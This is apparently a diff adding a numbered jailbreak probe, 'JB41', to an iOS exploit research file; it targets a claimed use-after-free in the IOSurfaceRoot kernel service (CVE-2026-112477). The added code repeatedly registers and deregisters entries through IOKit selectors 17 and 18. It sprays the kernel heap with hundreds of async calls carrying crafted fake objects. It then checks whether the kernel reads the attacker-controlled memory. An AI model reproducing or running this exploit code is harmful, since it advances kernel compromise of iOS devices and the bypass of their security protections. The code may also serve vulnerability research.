@@ -35482,3 +35482,382 @@ void iosurface_jb40_test(ISRLogBlock log, ISRDoneBlock done) {
     log(@"JB40: Calling done now");
     done(results);
 }
+
+#pragma mark - JB41: IOSurfaceRoot Registry UAF (CVE-2026-112477)
+
+static const char *jb41_rcName(uint32_t v) {
+    switch (v) {
+        case 0:          return "SUCCESS";
+        case 0xE00002C2: return "BadArgument";
+        case 0xE00002C9: return "InternalError(dup)";
+        case 0xE00002D8: return "NotAttached";
+        case 0xE00002BC: return "Error";
+        default:         return "?";
+    }
+}
+
+static unsigned int jb41_newWakePort(void) {
+    unsigned int p = 0;
+    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS)
+        return 0;
+    return p;
+}
+
+static void jb41_dropPort(unsigned int p) {
+    if (p) mach_port_mod_refs(mach_task_self(), p, MACH_PORT_RIGHT_RECEIVE, -1);
+}
+
+static int jb41_callSel(unsigned int conn, uint32_t sel, const uint64_t *in3,
+                         size_t inSz, int shape, unsigned int wp,
+                         int(*sym_call)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*),
+                         int(*sym_async)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*)) {
+    uint64_t buf[3] = {0, 0, 0};
+    if (in3) { buf[0] = in3[0]; buf[1] = in3[1]; buf[2] = in3[2]; }
+    uint64_t ref = 0x1122334455667788ull;
+    uint64_t zero = 0;
+    uint32_t soc = 0;
+    switch (shape) {
+        case 0:
+            return sym_call(conn, sel, NULL, 0, buf, inSz, NULL, NULL, NULL, NULL);
+        case 1:
+            return sym_async(conn, sel, wp, &ref, 1, NULL, 0, buf, inSz, NULL, &soc, NULL, NULL);
+        case 2:
+            return sym_async(conn, sel, wp, &zero, 1, NULL, 0, buf, inSz, NULL, &soc, NULL, NULL);
+        case 3:
+            return sym_async(conn, sel, wp, NULL, 0, NULL, 0, buf, inSz, NULL, &soc, NULL, NULL);
+    }
+    return -1;
+}
+
+void iosurface_registry_uaf(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        log(@"JB41: === IOSurfaceRoot Registry UAF (CVE-2026-112477) ===");
+        log(@"JB41: sel17=register, sel18=deregister, stale-read oracle");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        results[@"probe"] = @"JB41";
+
+        typedef void*(*matching_fn)(const char*);
+        typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+        typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+        typedef int(*svcclose_fn)(unsigned int);
+        typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+        typedef int(*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*);
+        typedef unsigned int(*iteratornext_fn)(unsigned int);
+        typedef int(*objrelease_fn)(unsigned int);
+
+        matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getmatch_fn sym_getmatch = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        svcopen_fn sym_open = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        svcclose_fn sym_close = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+        callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+        objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+
+        if (!sym_matching || !sym_getmatch || !sym_open || !sym_close || !sym_call || !sym_async) {
+            log(@"JB41: FAIL — dlsym missing IOKit symbols");
+            results[@"verdict"] = @"DLSYM_FAIL";
+            done(results);
+            return;
+        }
+
+        log([NSString stringWithFormat:@"JB41: dlsym OK — matching=%p open=%p call=%p async=%p", sym_matching, sym_open, sym_call, sym_async]);
+
+        void *matchDict = sym_matching("IOSurfaceRoot");
+        if (!matchDict) {
+            log(@"JB41: FAIL — IOServiceMatching returned NULL");
+            results[@"verdict"] = @"NO_SERVICE";
+            done(results);
+            return;
+        }
+
+        unsigned int svc = sym_getmatch(0, matchDict);
+        if (!svc) {
+            log(@"JB41: FAIL — IOSurfaceRoot service not found");
+            results[@"verdict"] = @"NO_SERVICE";
+            done(results);
+            return;
+        }
+        log([NSString stringWithFormat:@"JB41: IOSurfaceRoot service = 0x%x", svc]);
+
+        uint32_t SEL_REG = 17;
+        uint32_t SEL_DEREG = 18;
+
+        log(@"JB41: ========== STAGE A: Calibration ==========");
+        int bestShape = -1;
+        for (int shape = 0; shape < 4; shape++) {
+            if (isr_stopped()) break;
+            unsigned int conn = 0;
+            unsigned int wp = jb41_newWakePort();
+            int openRc = sym_open(svc, mach_task_self(), 0, &conn);
+            if (openRc != 0) {
+                jb41_dropPort(wp);
+                log([NSString stringWithFormat:@"JB41: [A] shape=%d open FAIL 0x%x", shape, (uint32_t)openRc]);
+                continue;
+            }
+            uint64_t in[3] = {1, 2, 3};
+            int rc = jb41_callSel(conn, SEL_REG, in, 24, shape, wp, sym_call, sym_async);
+            log([NSString stringWithFormat:@"JB41: [A] sel17 shape=%d -> 0x%x (%s)", shape, (uint32_t)rc, jb41_rcName((uint32_t)rc)]);
+            if (rc == 0 && bestShape < 0) bestShape = shape;
+            sym_close(conn);
+            jb41_dropPort(wp);
+        }
+
+        if (!isr_stopped()) {
+            unsigned int conn = 0;
+            unsigned int wp = jb41_newWakePort();
+            if (sym_open(svc, mach_task_self(), 0, &conn) == 0) {
+                uint64_t in[3] = {1, 2, 3};
+                int rc18 = jb41_callSel(conn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+                log([NSString stringWithFormat:@"JB41: [A] sel18 sync -> 0x%x (%s)", (uint32_t)rc18, jb41_rcName((uint32_t)rc18)]);
+                sym_close(conn);
+            }
+            jb41_dropPort(wp);
+        }
+
+        log([NSString stringWithFormat:@"JB41: [A] best shape = %d", bestShape]);
+        results[@"calibShape"] = @(bestShape);
+
+        if (bestShape < 0) {
+            log(@"JB41: ABORT — no working shape for sel17");
+            results[@"verdict"] = @"CALIBRATION_FAIL";
+            isr_checkpoint(@"JB41-uaf-checkpoint.json", results);
+            done(results);
+            if (sym_release) sym_release(svc);
+            return;
+        }
+
+        if (isr_stopped()) {
+            results[@"verdict"] = @"STOPPED";
+            done(results);
+            if (sym_release) sym_release(svc);
+            return;
+        }
+
+        log(@"JB41: ========== STAGE B: State Machine 17->18->17 x120 ==========");
+        int stageBok = 0;
+        for (int i = 0; i < 120; i++) {
+            if (isr_stopped()) break;
+            unsigned int conn = 0;
+            unsigned int wp = jb41_newWakePort();
+            if (sym_open(svc, mach_task_self(), 0, &conn) != 0) {
+                jb41_dropPort(wp);
+                continue;
+            }
+            uint64_t in[3] = {1, 2, 3};
+            int r1 = jb41_callSel(conn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            int r2 = jb41_callSel(conn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            int r3 = jb41_callSel(conn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+            int r4 = jb41_callSel(conn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            if (r1 == 0 && (uint32_t)r2 == 0xE00002C9 && r3 == 0 && r4 == 0) {
+                stageBok++;
+            } else if (i < 3) {
+                log([NSString stringWithFormat:@"JB41: [B] i=%d reg=0x%x dup=0x%x dereg=0x%x re-reg=0x%x", i, (uint32_t)r1, (uint32_t)r2, (uint32_t)r3, (uint32_t)r4]);
+            }
+            sym_close(conn);
+            jb41_dropPort(wp);
+        }
+        log([NSString stringWithFormat:@"JB41: [B] full-success %d/120%s", stageBok, (stageBok == 120) ? " — userspace controls registry insert/remove" : ""]);
+        results[@"stageBsuccess"] = @(stageBok);
+
+        if (isr_stopped()) {
+            results[@"verdict"] = @"STOPPED";
+            done(results);
+            if (sym_release) sym_release(svc);
+            return;
+        }
+
+        log(@"JB41: ========== STAGE E2: Stale-Read Oracle (size sweep) ==========");
+        unsigned int groomConn = 0;
+        int groomOpenRc = sym_open(svc, mach_task_self(), 0, &groomConn);
+        if (groomOpenRc != 0) {
+            log([NSString stringWithFormat:@"JB41: [E2] groom conn open FAIL 0x%x", (uint32_t)groomOpenRc]);
+            groomConn = 0;
+        }
+
+        int e2Hits = 0;
+        int e2Tries = 0;
+        int probeSizes[4] = {24, 48, 64, 96};
+
+        unsigned int oracleConn = 0;
+        int oracleOpenRc = sym_open(svc, mach_task_self(), 0, &oracleConn);
+        if (oracleOpenRc != 0) {
+            log([NSString stringWithFormat:@"JB41: [E2] oracle conn open FAIL 0x%x", (uint32_t)oracleOpenRc]);
+            results[@"verdict"] = @"OPEN_FAIL";
+            done(results);
+            if (groomConn) sym_close(groomConn);
+            if (sym_release) sym_release(svc);
+            return;
+        }
+
+        for (int s = 0; s < 4; s++) {
+            if (isr_stopped()) break;
+            int sz = probeSizes[s];
+            for (int i = 0; i < 10; i++) {
+                if (isr_stopped()) break;
+                unsigned int wp = jb41_newWakePort();
+                uint64_t in[3] = {1, 2, 3};
+
+                jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                int baseDup = jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                jb41_callSel(oracleConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                jb41_callSel(oracleConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                if (groomConn) {
+                    uint8_t fakebuf[256];
+                    memset(fakebuf, 0, sizeof(fakebuf));
+                    uint64_t *f = (uint64_t *)fakebuf;
+                    f[0] = 0x21;
+                    f[1] = 0x1122334455667788ull;
+                    f[2] = 0xfffffff007000000ull;
+                    f[3] = 0x43414E415259ull;
+                    f[4] = 0x4141414141414141ull;
+                    f[5] = 0x43414E415259ull;
+
+                    uint64_t groomRef = 0xA1B2C3D4E5F60708ull;
+                    int groomCount = 0;
+                    unsigned int groomPorts[512];
+                    for (int g = 0; g < 512; g++) {
+                        unsigned int gwp = jb41_newWakePort();
+                        if (!gwp) continue;
+                        int gr = sym_async(groomConn, 1000, gwp, &groomRef, 1, NULL, 0, fakebuf, (size_t)sz, NULL, NULL, NULL, NULL);
+                        if (gr == 0 || (uint32_t)gr == 0xE00002C2) {
+                            groomPorts[groomCount++] = gwp;
+                        } else {
+                            jb41_dropPort(gwp);
+                        }
+                    }
+
+                    int rdup = jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                    int rdreg = jb41_callSel(oracleConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                    int hit = ((uint32_t)baseDup == 0xE00002C9) && ((uint32_t)rdup != 0xE00002C9);
+                    if (hit) e2Hits++;
+                    e2Tries++;
+
+                    log([NSString stringWithFormat:@"JB41: [E2] sz=%d baseDup=0x%x dup=0x%x(%s) dereg=0x%x hit=%s groom=%d", sz, (uint32_t)baseDup, (uint32_t)rdup, jb41_rcName((uint32_t)rdup), (uint32_t)rdreg, hit ? "STALE-READ" : "no", groomCount]);
+
+                    for (int g = 0; g < groomCount; g++) {
+                        jb41_dropPort(groomPorts[g]);
+                    }
+                } else {
+                    e2Tries++;
+                }
+
+                jb41_dropPort(wp);
+                usleep(2000);
+            }
+            if (e2Hits > 0) break;
+        }
+
+        log([NSString stringWithFormat:@"JB41: [E2] done tries=%d hits=%d%s", e2Tries, e2Hits, e2Hits ? " — stale-entry reads groom object!" : " (no stale reads)"]);
+        results[@"e2Hits"] = @(e2Hits);
+        results[@"e2Tries"] = @(e2Tries);
+
+        if (isr_stopped()) {
+            results[@"verdict"] = @"STOPPED";
+            sym_close(oracleConn);
+            if (groomConn) sym_close(groomConn);
+            if (sym_release) sym_release(svc);
+            done(results);
+            return;
+        }
+
+        log(@"JB41: ========== STAGE E3: False-Positive Controls ==========");
+        int e3K1 = 0;
+        for (int i = 0; i < 10; i++) {
+            if (isr_stopped()) break;
+            unsigned int wp = jb41_newWakePort();
+            uint64_t in[3] = {1, 2, 3};
+            jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            jb41_callSel(oracleConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+            int r = jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            if ((uint32_t)r == 0xE00002C9) e3K1++;
+            jb41_dropPort(wp);
+            usleep(2000);
+        }
+        log([NSString stringWithFormat:@"JB41: [E3] K1 no-groom stale dup==0xC9: %d/10", e3K1]);
+
+        int e3K2 = 0;
+        for (int i = 0; i < 10; i++) {
+            if (isr_stopped()) break;
+            unsigned int wp = jb41_newWakePort();
+            uint64_t in[3] = {1, 2, 3};
+
+            jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            int baseDup2 = jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            jb41_callSel(oracleConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+            jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+            jb41_callSel(oracleConn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+            if (groomConn) {
+                uint8_t fakebuf2[256];
+                memset(fakebuf2, 0, sizeof(fakebuf2));
+                uint64_t *f2 = (uint64_t *)fakebuf2;
+                f2[0] = 0x21;
+                f2[1] = 0xDEADBEEFDEADBEEFull;
+                f2[2] = 0x4141414141410000ull;
+                f2[3] = 0xDEADBEEFDEADBEEFull;
+                f2[4] = 0x4141414141414141ull;
+                f2[5] = 0x43414E415259ull;
+
+                uint64_t groomRef2 = 0xA1B2C3D4E5F60708ull;
+                int groomCount2 = 0;
+                unsigned int groomPorts2[512];
+                for (int g = 0; g < 512; g++) {
+                    unsigned int gwp = jb41_newWakePort();
+                    if (!gwp) continue;
+                    int gr = sym_async(groomConn, 1000, gwp, &groomRef2, 1, NULL, 0, fakebuf2, 24, NULL, NULL, NULL, NULL);
+                    if (gr == 0 || (uint32_t)gr == 0xE00002C2) {
+                        groomPorts2[groomCount2++] = gwp;
+                    } else {
+                        jb41_dropPort(gwp);
+                    }
+                }
+
+                int r2 = jb41_callSel(oracleConn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                if ((uint32_t)baseDup2 == 0xE00002C9 && (uint32_t)r2 != 0xE00002C9) e3K2++;
+
+                for (int g = 0; g < groomCount2; g++) {
+                    jb41_dropPort(groomPorts2[g]);
+                }
+            }
+
+            jb41_dropPort(wp);
+            usleep(2000);
+        }
+        log([NSString stringWithFormat:@"JB41: [E3] K2 groom-marker-variant diff: %d/10", e3K2]);
+
+        results[@"e3K1"] = @(e3K1);
+        results[@"e3K2"] = @(e3K2);
+
+        sym_close(oracleConn);
+        if (groomConn) sym_close(groomConn);
+        if (sym_release) sym_release(svc);
+
+        NSString *verdict;
+        if (e2Hits > 0 && e3K2 > 0) {
+            verdict = @"UAF_STALE_READ";
+            log(@"JB41: [!!!!!] UAF CONFIRMED — kernel reads attacker-controlled groom object!");
+        } else if (e2Hits > 0) {
+            verdict = @"UAF_PARTIAL";
+            log(@"JB41: [!!!] Stale reads detected but control not confirmed");
+        } else if (stageBok >= 100) {
+            verdict = @"STATE_MACHINE_OK";
+            log(@"JB41: State machine works but no stale reads (zone mismatch or iOS 27 mitigation)");
+        } else {
+            verdict = @"NO_UAF";
+            log(@"JB41: No UAF detected on this iOS version");
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB41: Verdict: %@", verdict]);
+        log(@"JB41: =============================================");
+
+        isr_checkpoint(@"JB41-uaf-checkpoint.json", results);
+        done(results);
+    });
+}
